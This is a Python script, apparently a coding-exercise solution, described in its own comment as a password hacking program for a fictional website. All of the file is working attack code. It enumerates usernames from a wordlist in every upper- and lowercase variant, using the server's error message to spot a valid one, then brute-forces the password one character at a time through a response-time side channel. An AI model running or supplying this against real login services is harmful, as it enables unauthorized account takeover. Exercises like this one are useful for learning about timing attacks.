import itertools
import string
import sys
import socket
import json
import time

# A simple password hacking program that takes advantage of a fictional website which contains an exception time vulnerability.

def find_login(file, cur_socket):
    for line in file:
        login = line.rstrip('\n')
        login_combinations = list(
            map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in login))))

        for combination in login_combinations:
            login_dict = {'login': combination, 'password': ' '}
            cur_socket.send(json.dumps(login_dict).encode())

            login_response = json.loads(cur_socket.recv(1024).decode())
            if login_response['result'] == 'Wrong password!':
                return combination


# Brute force the password using the provided login and execution execution time vulnerability.
def find_password(login, cur_socket):
    password_characters = string.ascii_letters + string.digits
    login_dict = {'login': login, 'password': ''}

    password_string = ''
    while True:
        for character in password_characters:
            login_dict['password'] = password_string + character
            cur_socket.send(json.dumps(login_dict).encode())

            start = time.perf_counter()
            password_response = json.loads(cur_socket.recv(1024).decode())
            end = time.perf_counter()
            execution_time = (end - start)

            if execution_time >= 0.1:
                password_string += character
                break
            if password_response['result'] == 'Connection success!':
                password_string += character
                return password_string


args = sys.argv
hostname = args[1]
port = int(args[2])
with socket.socket() as client_socket:
    client_socket.connect((hostname, port))

    logins_file = open('logins.txt', 'r')
    correct_login = find_login(logins_file, client_socket)
    correct_password = find_password(correct_login, client_socket)

    correct = {'login': correct_login, 'password': correct_password}
    correct = json.dumps(correct)
    print(correct)
